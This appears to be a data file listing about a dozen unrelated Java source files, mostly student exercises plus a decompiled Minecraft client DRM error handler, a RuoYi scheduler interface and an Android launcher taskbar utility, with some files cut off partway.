    "/*    */ package com.cout970.rocketdrm;\r\n/*    */ \r\n/*    */ import java.io.ByteArrayOutputStream;\r\n/*    */ import java.io.PrintStream;\r\n/*    */ import java.util.List;\r\n/*    */ import java.util.Map;\r\n/*    */ import java.util.function.Consumer;\r\n/*    */ import javax.swing.JOptionPane;\r\n/*    */ import net.minecraft.launchwrapper.Launch;\r\n/*    */ import org.apache.commons.lang3.text.WordUtils;\r\n/*    */ \r\n/*    */ \r\n/*    */ \r\n/*    */ \r\n/*    */ public class ErrorHandler\r\n/*    */ {\r\n/*    */   public static void showError(String error) {\r\n/* 18 */     if (error == null) {\r\n/* 19 */       error = \"Internal error\";\r\n/*    */     }\r\n/*    */     \r\n/* 22 */     String info = WordUtils.wrap(\"[Error] \" + error, 80);\r\n/* 23 */     String msg = \"================================================================================\\nThe client has encountered and error and will be closed.\\n\\n\" + info + \"\\n\\nIf you believe this is a bug contact the developers.\\n================================================================================\\n\";\r\n/*    */ \r\n/*    */ \r\n/*    */ \r\n/*    */ \r\n/*    */     \r\n/* 29 */     System.err.println(\"\\n\" + msg);\r\n/* 30 */     JOptionPane.showMessageDialog(null, msg);\r\n/*    */     \r\n/* 32 */     Map<String, Object> drm_inject = (Map<String, Object>)Launch.blackboard.get(\"DRM-InjectData\");\r\n/* 33 */     List<Consumer<String>> handlers = (List<Consumer<String>>)drm_inject.get(\"error-handlers\");\r\n/* 34 */     if (handlers != null) {\r\n/* 35 */       for (Consumer<String> handler : handlers) {\r\n/*    */         try {\r\n/* 37 */           handler.accept(error);\r\n/* 38 */         } catch (Throwable e) {\r\n/* 39 */           e.printStackTrace();\r\n/*    */         } \r\n/*    */       } \r\n/*    */     }\r\n/* 43 */     JniUtil.hardCrash();\r\n/*    */   }\r\n/*    */   \r\n/*    */   public static void showCrash(Thread th, Throwable exception) {\r\n/* 47 */     Throwable original = exception;\r\n/* 48 */     while (original.getCause() != null) {\r\n/* 49 */       original = original.getCause();\r\n/*    */     }\r\n/* 51 */     exception.printStackTrace();\r\n/*    */     \r\n/* 53 */     String msg = original.getMessage();\r\n/* 54 */     if (msg == null) {\r\n/* 55 */       ByteArrayOutputStream stream = new ByteArrayOutputStream();\r\n/* 56 */       original.printStackTrace(new PrintStream(stream));\r\n/* 57 */       msg = stream.toString().split(\"\\n\", 2)[0];\r\n/*    */     } \r\n/*    */     \r\n/* 60 */     showError(th + \" \" + msg);\r\n/*    */   }\r\n/*    */ }\r\n",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise09Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        this.outContent.reset();\n        this.errContent.reset();\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n\n    @Test\n    @DisplayName(\"Check do-while loop iterations\")\n    void testDoWhileLoopIterations() {\n        int n1 = 15;\n        Exercise09.doWhileLoop(n1);\n        for (int num = 0; num < n1; num++) {\n            String expectedMessage = \"Entra con valor: \"+num+\", sale con valor: \"+(num+1);\n            assertTrue(this.outContent.toString().contains(expectedMessage), \"Loop inspection message is not correct\");\n        }\n    }\n}\n",
    "package fr.cda.bookstore.exception;\n\nimport com.fasterxml.jackson.annotation.JsonInclude;\n\nimport java.time.LocalDateTime;\nimport java.util.List;\n\n@JsonInclude(JsonInclude.Include.NON_NULL)\npublic class ExceptionMessage {\n    private LocalDateTime date;\n    private String request;\n    private String message;\n    private List<String> details;\n\n    public ExceptionMessage(LocalDateTime date, String request, String message) {\n        this.date = date;\n        this.request = request;\n        this.message = message;\n    }\n\n    public ExceptionMessage(LocalDateTime date, String request, String message, List<String> details) {\n        this.date = date;\n        this.request = request;\n        this.message = message;\n        this.details = details;\n    }\n\n    public LocalDateTime getDate() {\n        return date;\n    }\n\n    public void setDate(LocalDateTime date) {\n        this.date = date;\n    }\n\n    public String getRequest() {\n        return request;\n    }\n\n    public void setRequest(String request) {\n        this.request = request;\n    }\n\n    public String getMessage() {\n        return message;\n    }\n\n    public void setMessage(String message) {\n        this.message = message;\n    }\n\n    public List<String> getDetails() {\n        return details;\n    }\n\n    public void setDetails(List<String> details) {\n        this.details = details;\n    }\n}\n",
    "package com.ruoyi.quartz.service;\n\nimport java.util.List;\nimport org.quartz.SchedulerException;\nimport com.ruoyi.common.exception.job.TaskException;\nimport com.ruoyi.quartz.domain.SysJob;\n\n/**\n * \u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6\u4fe1\u606f\u4fe1\u606f \u670d\u52a1\u5c42\n * \n * @author ruoyi\n */\npublic interface ISysJobService\n{\n    /**\n     * \u83b7\u53d6quartz\u8c03\u5ea6\u5668\u7684\u8ba1\u5212\u4efb\u52a1\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u8c03\u5ea6\u4efb\u52a1\u96c6\u5408\n     */\n    public List<SysJob> selectJobList(SysJob job);\n\n    /**\n     * \u901a\u8fc7\u8c03\u5ea6\u4efb\u52a1ID\u67e5\u8be2\u8c03\u5ea6\u4fe1\u606f\n     * \n     * @param jobId \u8c03\u5ea6\u4efb\u52a1ID\n     * @return \u8c03\u5ea6\u4efb\u52a1\u5bf9\u8c61\u4fe1\u606f\n     */\n    public SysJob selectJobById(Long jobId);\n\n    /**\n     * \u6682\u505c\u4efb\u52a1\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public int pauseJob(SysJob job) throws SchedulerException;\n\n    /**\n     * \u6062\u590d\u4efb\u52a1\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public int resumeJob(SysJob job) throws SchedulerException;\n\n    /**\n     * \u5220\u9664\u4efb\u52a1\u540e\uff0c\u6240\u5bf9\u5e94\u7684trigger\u4e5f\u5c06\u88ab\u5220\u9664\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public int deleteJob(SysJob job) throws SchedulerException;\n\n    /**\n     * \u6279\u91cf\u5220\u9664\u8c03\u5ea6\u4fe1\u606f\n     * \n     * @param jobIds \u9700\u8981\u5220\u9664\u7684\u4efb\u52a1ID\n     * @return \u7ed3\u679c\n     */\n    public void deleteJobByIds(Long[] jobIds) throws SchedulerException;\n\n    /**\n     * \u4efb\u52a1\u8c03\u5ea6\u72b6\u6001\u4fee\u6539\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public int changeStatus(SysJob job) throws SchedulerException;\n\n    /**\n     * \u7acb\u5373\u8fd0\u884c\u4efb\u52a1\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public boolean run(SysJob job) throws SchedulerException;\n\n    /**\n     * \u65b0\u589e\u4efb\u52a1\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public int insertJob(SysJob job) throws SchedulerException, TaskException;\n\n    /**\n     * \u66f4\u65b0\u4efb\u52a1\n     * \n     * @param job \u8c03\u5ea6\u4fe1\u606f\n     * @return \u7ed3\u679c\n     */\n    public int updateJob(SysJob job) throws SchedulerException, TaskException;\n\n    /**\n     * \u6821\u9a8ccron\u8868\u8fbe\u5f0f\u662f\u5426\u6709\u6548\n     * \n     * @param cronExpression \u8868\u8fbe\u5f0f\n     * @return \u7ed3\u679c\n     */\n    public boolean checkCronExpressionIsValid(String cronExpression);\n}\n",
    "import java.util.Scanner;\n\npublic class Equacao2Grau {\n\n    public static void main(String[] args) {\n        // Declara\u00e7\u00e3o\n        int a;\n        int b;\n        int c;\n        double delta;\n        double x1;\n        double x2;\n        Scanner sc = new Scanner(System.in);\n\n        // Entrada\n        System.out.println(\"Digite os elementos da equa\u00e7\u00e3o separados por v\u00edrgula (a, b, c):\");\n        String input = sc.nextLine();\n\n        // Dividir a entrada em partes usando a v\u00edrgula como delimitador\n        String[] parts = input.split(\",\");\n\n        // Verificar se h\u00e1 tr\u00eas partes (a, b, c)\n        if (parts.length != 3) {\n            System.out.println(\"Entrada inv\u00e1lida. Voc\u00ea deve fornecer exatamente tr\u00eas valores separados por v\u00edrgula.\");\n            sc.close();\n            return;\n        }\n\n        // Converter as partes em valores inteiros\n        try {\n            a = Integer.parseInt(parts[0].trim());\n            b = Integer.parseInt(parts[1].trim());\n            c = Integer.parseInt(parts[2].trim());\n\n            if (a == 0 && c == 0) {\n                System.out.println(\"X = 0\");\n                sc.close();\n                return;\n            }\n        } catch (NumberFormatException e) {\n            System.out.println(\"Erro ao converter valores. Certifique-se de que os valores fornecidos s\u00e3o n\u00fameros v\u00e1lidos.\");\n            sc.close();\n            return;\n        }\n\n        // Processamento e sa\u00edda\n        if (a == 0) {\n            if ( b == 0 ){\n        \tSystem.out.println(\"A e B n\u00e3o podem ser 0.\");\n            } else {\n            x1 = ((-c)/b);\n            System.out.println(\"Se A = 0 ent\u00e3o a equa\u00e7\u00e3o \u00e9 de 1\u00b0, o resultado de x \u00e9: \" + x1);\n            System.exit(0);\n            }\n        }\n        else  if ( b == 0) {\n                x1 = Math.sqrt(c / a);\n                System.out.println(\"A equa\u00e7\u00e3o possui uma raiz real: X = \" + x1);\n                System.exit(0);\n            } \n        delta = (Math.pow(b, 2.0) - (4 * a * c));\n        if ( delta < 0){\n                System.out.println(\"A equa\u00e7\u00e3o n\u00e3o possui ra\u00edzes reais.\");\n            \t}else if (delta == 0) {\n            \t\tx1 = ( -b / (2*a));\n            \t\tSystem.out.println(\"A equa\u00e7\u00e3o possui apenas um resultado real: \" + x1);\n                }\n         else {\n            x1 = (-b + Math.sqrt(delta)) / (2.0 * a);\n            x2 = (-b - Math.sqrt(delta)) / (2.0 * a);\n\n            System.out.println(\"O resultado do X1 \u00e9: \" + x1);\n            System.out.println(\"E X2 \u00e9: \" + x2);\n        }\n\n        sc.close();\n    }\n    }\n",
    "\npackage actividad.pkg1.extruc;\n\n\npublic class listaCircular {\n        \n        nodoc primeri;\n        nodoc ultima;\n        \n            public listaCircular(){\n              \n                primeri = null;\n                ultima = null;\n            }\n            public void ingresarN(int x){\n                nodoc nuevo = new nodoc();\n                nuevo.dat = x;\n                \n                if(primeri == null){\n                    primeri = nuevo;\n                    ultima = primeri;\n                    primeri.siguient = ultima;\n                }else{\n                    ultima.siguient = nuevo;\n                    nuevo.siguient = primeri;\n                    ultima = nuevo;\n                }\n            }\n            \n            public void mostrarlis(){\n            nodoc recorrido = new nodoc();\n            recorrido = primeri;\n            do{\n                System.out.println(recorrido.dat);\n                recorrido = recorrido.siguient;\n            }while(recorrido != primeri);\n        }\n            \n            \n            \n    \n}\n",
    "package co.edu.unbosque.model.persistence;\r\n\r\nimport java.util.ArrayList;\r\n\r\nimport co.edu.unbosque.model.PokemonAguaDTO;\r\n\r\n\r\npublic class PokemonAguaDAO implements CRUDOperation<PokemonAguaDTO> {\r\n\tprivate ArrayList<PokemonAguaDTO> listaPokemonesAgua;\r\n\tprivate String FILE_NAME = \"datos/PokemonAgua.csv\";\r\n\tprivate final String SERIALIZED_FILE_NAME = \"datos/PokemonAgua.jpd\";\r\n\r\n\tpublic PokemonAguaDAO() {\r\n\t\tlistaPokemonesAgua = new ArrayList<>();\r\n\t\t// leerArchivo();\r\n\t\tleerArchivoGeneralizado();\r\n\t}\r\n\r\n\tpublic void leerArchivoGeneralizado() {\r\n\t\tObject contenido = FileHandler.abrirLeerSerializado(SERIALIZED_FILE_NAME);\r\n\t\tif (contenido == null) {\r\n\t\t\tlistaPokemonesAgua = new ArrayList<>();\r\n\t\t} else {\r\n\t\t\tlistaPokemonesAgua = (ArrayList<PokemonAguaDTO>)contenido;\r\n\t\t}\r\n\t}\r\n\r\n\tpublic void leerArchivo() {\r\n\t\tString contenido = FileHandler.abrirLeerArchivo(FILE_NAME);\r\n\t\t// si esta vacio cree la lista y devuelvace\r\n\t\tif (contenido.equals(\"\")) {\r\n\t\t\tlistaPokemonesAgua = new ArrayList<>();\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tlistaPokemonesAgua = new ArrayList<>();\r\n\t\tString[] filas = contenido.split(\"\\n\"); // este array me esta separando cada fila, si tengo 20 filas tendra 20\r\n\t\t\t\t\t\t\t\t\t\t\t\t// espacios. cuando split encuentre el espasio guardara en la posicion\r\n\t\t\t\t\t\t\t\t\t\t\t\t// despues de haber separado por filas lo separaremos por columnas\r\n\r\n\t\tfor (int i = 0; i < filas.length; i++) {\r\n\t\t\tString[] columnas = filas[i].split(\";\");\r\n\r\n\t\t\tPokemonAguaDTO aux = new PokemonAguaDTO();\r\n\t\t\taux.setGeneracion(Integer.parseInt(columnas[0]));\r\n\t\t\taux.setNumero(Integer.parseInt(columnas[1]));\r\n\t\t\taux.setNombre(columnas[2]);\r\n\t\t\taux.setAltura(Double.parseDouble(columnas[3]));\r\n\t\t\taux.setPeso(Double.parseDouble(columnas[4]));\r\n\t\t\taux.setColor(columnas[5]);\r\n\t\t\taux.setPs(Integer.parseInt(columnas[6]));\r\n\t\t\taux.setAtaque(Integer.parseInt(columnas[7]));\r\n\t\t\taux.setDefensa(Integer.parseInt(columnas[8]));\r\n\t\t\taux.setAtaqueEspecial(Integer.parseInt(columnas[9]));\r\n\t\t\taux.setDefensaEspecial(Integer.parseInt(columnas[10]));\r\n\t\t\taux.setVelocidad(Integer.parseInt(columnas[11]));\r\n\t\t\taux.setDescripAtaque(columnas[12]);\r\n\t\t\taux.setHabilidad(columnas[13]);\r\n\t\t\taux.setHabilidadOculta(columnas[14]);\r\n\t\t\taux.setTipo(columnas[15]);\r\n\t\t\taux.setPuedeNadar(Boolean.parseBoolean(columnas[16]));\r\n\t\t\taux.setTieneAletas(Boolean.parseBoolean(columnas[17]));\r\n\t\t}\r\n\r\n\t}\r\n\r\n\tpublic void escribirEnArchivo() {\r\n\t\tString contenido = \"\";\r\n\t\t// si tya estoy en la ultima linea ya no haga el salto de linea\r\n\t\tfor (int i = 0; i < listaPokemonesAgua.size(); i++) {\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getGeneracion() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getNumero() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getNombre() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getAltura() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getPeso() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getColor() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getPs() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getAtaque() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getDefensa() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getAtaqueEspecial() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getDefensaEspecial() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getVelocidad() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getDescripAtaque() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getHabilidad() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getHabilidadOculta() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).getTipo() + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).isPuedeNadar()  + \";\";\r\n\t\t\tcontenido += listaPokemonesAgua.get(i).isTieneAletas() + \";\";\r\n\t\t\tif (i < listaPokemonesAgua.size() - 1) {\r\n\t\t\t\tcontenido += \"\\n\";\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tFileHandler.abrirEscribirArchivo(FILE_NAME, contenido);\r\n\t}\r\n\r\n\t// JUAND. REVISE ESTO BIEN POR FAVOOOOOOOOOOOOR\r\n\tpublic String checkIndex(int index) {\r\n\t\tif (index < 0) {\r\n\t\t\treturn \"n\";\r\n\t\t}\r\n\t\tif (index >= listaPokemonesAgua.size()) {\r\n\t\t\treturn \"o\";\r\n\t\t}\r\n\t\treturn \"g\";\r\n\t}\r\n\r\n\tpublic PokemonAguaDTO getLast() {\r\n\t\treturn listaPokemonesAgua.get(listaPokemonesAgua.size() - 1);\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void create(PokemonAguaDTO data) {\r\n\t\tlistaPokemonesAgua.add(data);\r\n\t\tFileHandler.abrirEscribirSerializado(SERIALIZED_FILE_NAME, listaPokemonesAgua);\r\n\t}\r\n\r\n\t@Override\r\n\tpublic String readAll() {\r\n\t\tStringBuilder sb = new StringBuilder();\r\n\t\tlistaPokemonesAgua.forEach((e) -> {\r\n\t\t\tsb.append(e.toString()+ \"\\n\\n\" );\r\n\t\t});\r\n\t\treturn sb.toString();\r\n\t}\r\n\r\n\t@Override\r\n\tpublic String update(int index, PokemonAguaDTO newData) {\r\n\t\tif (index < 0) {\r\n\t\t\treturn \"las posiciones no pueden ser negativas\";\r\n\t\t}\r\n\t\tif (index >= listaPokemonesAgua.size()) {\r\n\t\t\treturn \"El indice se a pasado del tama\u00f1o de la lista, tama\u00f1o actual: \" + listaPokemonesAgua.size()\r\n\t\t\t\t\t+ \" datos\";\r\n\t\t}\r\n\t\tlistaPokemonesAgua.set(index, newData);\r\n\t\tFileHandler.abrirEscribirSerializado(SERIALIZED_FILE_NAME, listaPokemonesAgua);\r\n\t\treturn",
    "/*\n * Copyright (C) 2023 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.android.launcher3.taskbar;\n\nimport static com.android.launcher3.Utilities.dpToPx;\nimport static com.android.launcher3.Utilities.dpiFromPx;\n\nimport android.content.res.Resources;\nimport android.util.DisplayMetrics;\n\nimport androidx.core.content.res.ResourcesCompat;\n\nimport com.android.launcher3.DeviceProfile;\nimport com.android.launcher3.R;\nimport com.android.launcher3.config.FeatureFlags;\n\n/**\n * Utility class that contains the different taskbar thresholds logic.\n */\npublic class TaskbarThresholdUtils {\n\n    // We divide the screen into this many parts, and use the result to scale the thresholds to\n    // any size device. Note that this value was calculated arbitrarily by using two tablet devices\n    // as data points.\n    private static final float SCREEN_UNITS = 1 / 80f;\n\n    private static int getThreshold(Resources r, DeviceProfile dp, int thresholdDimen,\n            int multiplierDimen) {\n        if (!FeatureFlags.ENABLE_DYNAMIC_TASKBAR_THRESHOLDS.get()) {\n            return r.getDimensionPixelSize(thresholdDimen);\n        }\n\n        float landscapeScreenHeight = dp.isLandscape ? dp.heightPx : dp.widthPx;\n        float screenPart = (landscapeScreenHeight * SCREEN_UNITS);\n        float defaultDp = dpiFromPx(screenPart, DisplayMetrics.DENSITY_DEVICE_STABLE);\n        float thisDp = dpToPx(defaultDp);\n        float multiplier = ResourcesCompat.getFloat(r, multiplierDimen);\n        float value = (thisDp) * multiplier;\n\n        return Math.round(value);\n    }\n\n    /**\n     * Returns the threshold that determines if we should show taskbar.\n     */\n    public static int getFromNavThreshold(Resources r, DeviceProfile dp) {\n        return getThreshold(r, dp, R.dimen.taskbar_from_nav_threshold,\n                R.dimen.taskbar_nav_threshold_mult);\n    }\n\n    /**\n     * Returns the threshold that we start moving the app window.\n     */\n    public static int getAppWindowThreshold(Resources r, DeviceProfile dp) {\n        return getThreshold(r, dp, R.dimen.taskbar_app_window_threshold,\n                R.dimen.taskbar_app_window_threshold_mult);\n    }\n\n    /**\n     * Returns the threshold for whether we land in home or overview.\n     */\n    public static int getHomeOverviewThreshold(Resources r, DeviceProfile dp) {\n        return getThreshold(r, dp, R.dimen.taskbar_home_overview_threshold,\n                R.dimen.taskbar_home_overview_threshold_mult);\n    }\n\n    /**\n     * Returns the threshold that we use to allow swipe to catch up to finger.\n     */\n    public static int getCatchUpThreshold(Resources r, DeviceProfile dp) {\n        return getThreshold(r, dp, R.dimen.taskbar_catch_up_threshold,\n                R.dimen.taskbar_catch_up_threshold_mult);\n    }\n}\n",
    "package Controller;\n\nimport View.ViewNotePad;\n\nimport java.awt.FileDialog;\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.FileWriter;\n\n    public class FileController {\n        ViewNotePad gui;\n        String fileName;\n        String fileAddress;\n        public FileController(ViewNotePad gui) {\n            this.gui=gui;\n        }\n        public void newFile() {\n            gui.textArea.setText(\"\");\n            gui.window.setTitle(\"New\");\n            fileName=null;\n            fileAddress=null;\n        }\n        public void open() {\n            FileDialog fd =new FileDialog(gui.window, \"Open\",FileDialog.LOAD);\n            fd.setVisible(true);\n            if(fd.getFile()!=null) {\n                fileName =fd.getFile();\n                fileAddress =fd.getDirectory();\n                gui.window.setTitle(fileName);\n\n            }\n            System.out.println(\"File address and file name \"+fileAddress+fileName);\n            try {\n                BufferedReader br = new BufferedReader(new FileReader(fileAddress+fileName));\n                gui.textArea.setText(\"\");\n                String line=null;\n                while((line =br.readLine())!=null) {\n                    gui.textArea.append(line+ \"\\n\");\n                }br.close();\n            }catch(Exception e) {\n                System.out.println(\"FILE NOT OPPENED!\");\n            }\n        }\n        public void save() {\n            if (fileName==null) {\n                saveAs();\n            }else {\n                try {\n                    FileWriter fw = new FileWriter(fileAddress+fileName);\n                    fw.write(gui.textArea.getText());\n                    gui.window.setTitle(fileName);\n                    fw.close();\n                }catch (Exception e) {\n                    System.out.println(\"SOMETHING WRONG!\");\n                }\n            }\n        }\n        public void saveAs() {\n            FileDialog fd = new FileDialog(gui.window, \"Save\",FileDialog.SAVE);\n            fd.setVisible(true);\n            if(fd.getFile()!=null) {\n                fileName=fd.getFile()\n                ;\n                fileAddress=fd.getDirectory();\n                gui.window.setTitle(fileName);\n            }\n            try {\n                FileWriter fw = new FileWriter(fileAddress+fileName);\n                fw.write(gui.textArea.getText());\n                fw.close();\n            }catch(Exception e) {}\n            System.out.println(\"SOMETHING WRONG! \");\n\n        }\n        public void exit() {\n            System.exit(0);\n        }\n    }\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "import java.util.ArrayList;\nimport java.util.Scanner;\n\npublic class ListMaker {\n    private static Scanner in = new Scanner(System.in);\n\n    private static ArrayList<String> lines = new ArrayList<>();\n\n    private static String line = \"\";\n\n    private static boolean confirmQuit = false;\n\n    public static void main(String[] args) {\n\n        String menuPrompt = \"A - Add  D - Delete  P - Print  Q - Quit\";\n        String cmd = \"\"; //A, I, D, V, or Q\n        boolean done = false;\n\n        do {\n\n            //Display Current List\n            displayList();\n\n            //Display command menu in the input prompt and get user cmd input\n            cmd = SafeInput.getRegExString(in, menuPrompt, \"[AaDdPpQq]\");\n\n            cmd = cmd.toUpperCase();\n\n            //execute\n            switch (cmd) {\n                case \"A\":\n                    addItem();\n                    break;\n                case \"D\":\n                    deleteItem();\n                    break;\n                case \"P\":\n                    displayList();\n                    break;\n                case \"Q\":\n                    quitList();\n                    break;\n            }\n\n        }while(!done);\n    }\n\n    private static void quitList() {\n        confirmQuit = SafeInput.getYNConfirm(in, \"Are you sure you want to quit?\");\n        if(confirmQuit)\n            System.exit(0);\n    }\n\n    private static void addItem() {\n        line = SafeInput.getNonZeroLenString(in, \"Enter the new item to add to the list\");\n        lines.add(line);\n    }\n\n    private static void deleteItem() {\n        //get an item number for the item to delete from the user\n        int itemToDelete = 0;\n        int indexToDelete = 0;\n\n        itemToDelete = SafeInput.getRangedInt(in, \"Enter the number of the item you want to delete: \", 1, lines.size());\n        //convert the item to an index\n        itemToDelete = itemToDelete - 1;\n        lines.remove(itemToDelete);\n    }\n\n    private static void displayList() {\n        System.out.println(\"==========================================\");\n        if(lines.size() > 0) {\n            int itemNum = 1;\n            for(String l:lines) {\n                System.out.println(itemNum + \". \" + l);\n                itemNum++;\n            }\n        } else {\n            System.out.println(\"The list is currently empty!\");\n        }\n        System.out.println(\"==========================================\");\n    }\n\n}\n",
    "import java.io.*;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Scanner;\r\n\r\nclass Student {\r\n    private String name;\r\n    private int rollNumber;\r\n    private String grade;\r\n\r\n    public Student(String name, int rollNumber, String grade) {\r\n        this.name = name;\r\n        this.rollNumber = rollNumber;\r\n        this.grade = grade;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public int getRollNumber() {\r\n        return rollNumber;\r\n    }\r\n\r\n    public String getGrade() {\r\n        return grade;\r\n    }\r\n\r\n    @Override\r\n    public String toString() {\r\n        return \"Name: \" + name + \", Roll Number: \" + rollNumber + \", Grade: \" + grade;\r\n    }\r\n}\r\n\r\nclass StudentManagementSystem {\r\n    private List<Student> students;\r\n    private String fileName;\r\n\r\n    public StudentManagementSystem(String fileName) {\r\n        this.fileName = fileName;\r\n        students = new ArrayList<>();\r\n        loadStudents();\r\n    }\r\n\r\n    private void loadStudents() {\r\n        try (BufferedReader reader = new BufferedReader(new FileReader(fileName))) {\r\n            String line;\r\n            while ((line = reader.readLine()) != null) {\r\n                String[] parts = line.split(\",\");\r\n                if (parts.length == 3) {\r\n                    students.add(new Student(parts[0], Integer.parseInt(parts[1]), parts[2]));\r\n                }\r\n            }\r\n        } catch (IOException | NumberFormatException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void saveStudents() {\r\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName))) {\r\n            for (Student student : students) {\r\n                writer.write(student.getName() + \",\" + student.getRollNumber() + \",\" + student.getGrade() + \"\\n\");\r\n            }\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public void addStudent(Student student) {\r\n        students.add(student);\r\n        saveStudents();\r\n    }\r\n\r\n    public void removeStudent(int rollNumber) {\r\n        students.removeIf(student -> student.getRollNumber() == rollNumber);\r\n        saveStudents();\r\n    }\r\n\r\n    public Student findStudent(int rollNumber) {\r\n        for (Student student : students) {\r\n            if (student.getRollNumber() == rollNumber) {\r\n                return student;\r\n            }\r\n        }\r\n        return null;\r\n    }\r\n\r\n    public void displayAllStudents() {\r\n        for (Student student : students) {\r\n            System.out.println(student);\r\n        }\r\n    }\r\n}\r\n\r\npublic class student_management {\r\n    public static void main(String[] args) {\r\n        StudentManagementSystem sms = new StudentManagementSystem(\"students.txt\");\r\n        Scanner scanner = new Scanner(System.in);\r\n        int choice;\r\n\r\n        do {\r\n            System.out.println(\"\\nStudent Management System\");\r\n            System.out.println(\"1. Add Student\");\r\n            System.out.println(\"2. Remove Student\");\r\n            System.out.println(\"3. Search for Student\");\r\n            System.out.println(\"4. Display All Students\");\r\n            System.out.println(\"5. Exit\");\r\n            System.out.print(\"Enter your choice: \");\r\n            choice = scanner.nextInt();\r\n            scanner.nextLine(); // Consume newline\r\n\r\n            switch (choice) {\r\n                case 1:\r\n                    System.out.print(\"Enter student name: \");\r\n                    String name = scanner.nextLine();\r\n                    System.out.print(\"Enter student roll number: \");\r\n                    int rollNumber = scanner.nextInt();\r\n                    scanner.nextLine(); // Consume newline\r\n                    System.out.print(\"Enter student grade: \");\r\n                    String grade = scanner.nextLine();\r\n                    sms.addStudent(new Student(name, rollNumber, grade));\r\n                    break;\r\n                case 2:\r\n                    System.out.print(\"Enter student roll number to remove: \");\r\n                    int rollToRemove = scanner.nextInt();\r\n                    sms.removeStudent(rollToRemove);\r\n                    break;\r\n                case 3:\r\n                    System.out.print(\"Enter student roll number to search: \");\r\n                    int rollToSearch = scanner.nextInt();\r\n                    Student foundStudent = sms.findStudent(rollToSearch);\r\n                    if (foundStudent != null) {\r\n                        System.out.println(\"Student found: \" + foundStudent);\r\n                    } else {\r\n                        System.out.println(\"Student not found.\");\r\n                    }\r\n                    break;\r\n                case 4:\r\n                    System.out.println(\"All Students:\");\r\n                    sms.displayAllStudents();\r\n                    break;\r\n                case 5:\r\n                    System.out.println(\"Exiting...\");\r\n                    break;\r\n                default:\r\n                    System.out.println(\"Invalid choice.",
    "package servlets;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.Optional;\n\nimport javax.servlet.RequestDispatcher;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.bittercode.constant.ResponseCode;\nimport com.bittercode.model.StoreException;\nimport com.bittercode.model.UserRole;\nimport com.bittercode.util.StoreUtil;\n\npublic class ErrorHandlerServlet extends HttpServlet {\n\n    public void service(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException {\n        PrintWriter pw = res.getWriter();\n        res.setContentType(\"text/html\");\n\n        // Fetch the exceptions\n        Throwable throwable = (Throwable) req.getAttribute(\"javax.servlet.error.exception\");\n        Integer statusCode = (Integer) req.getAttribute(\"javax.servlet.error.status_code\");\n        String servletName = (String) 